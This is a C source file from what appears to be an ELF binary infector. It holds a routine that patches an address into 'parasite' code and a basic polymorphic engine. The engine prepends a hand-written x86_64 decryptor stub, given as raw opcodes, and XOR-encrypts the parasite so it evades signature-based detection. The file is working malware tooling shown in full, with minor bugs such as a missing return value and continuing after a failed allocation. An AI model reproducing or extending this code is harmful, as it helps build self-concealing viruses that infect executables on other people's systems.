#include "elfit.h"

#define X86_64_POLYKEY_IND 14
#define X86_64_SIZE_IND    25

int patch_parasite64(Elfit_t *parasite, uint32_t patchpos, uint64_t vaddr)
{
    if (patchpos >= parasite->file->st_size)
        return -1;
    *(uint64_t *)&parasite->mem[patchpos] = vaddr;

    return 0;
}

/* x86_64 specific primitize polymorphic engine */
int parasite_polymorphize64(Elfit_t *parasite, char key)
{
    unsigned char preamble[] = {
          0xeb, 0x02, 0xeb, 0x13, 0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31,
          0xf6, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xe8, 0xeb, 0xff, 0xff, 0xff, 0x5b,
          0xbe, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc3, 0x16, 0x48, 0x31, 0x04,
          0x3b, 0x48, 0xff, 0xc7, 0x48, 0x39, 0xf7, 0x7c, 0xf4
    };
    unsigned int preamble_len = 45;
    int i;
    char *newmem;

    newmem = malloc(preamble_len + parasite->file->st_size);
    if (newmem==NULL)
    {
        perror("allocating space for polymorphic preamble\n");
    }
    memcpy(newmem, preamble, preamble_len);

    /* modify polymorphic parameters */
    *(uint32_t *)&newmem[X86_64_POLYKEY_IND] = key;
    *(uint32_t *)&newmem[X86_64_SIZE_IND] = parasite->file->st_size;

    memcpy(&newmem[preamble_len], parasite->mem, parasite->file->st_size);

    /* now xor encrypt the origin machine code */
    for (i=0;i<parasite->file->st_size;i++)
        newmem[preamble_len+i] ^= key;

    /* debug */
    parasite->file->st_size += preamble_len;

    free(parasite->mem);
    parasite->mem = newmem;
}
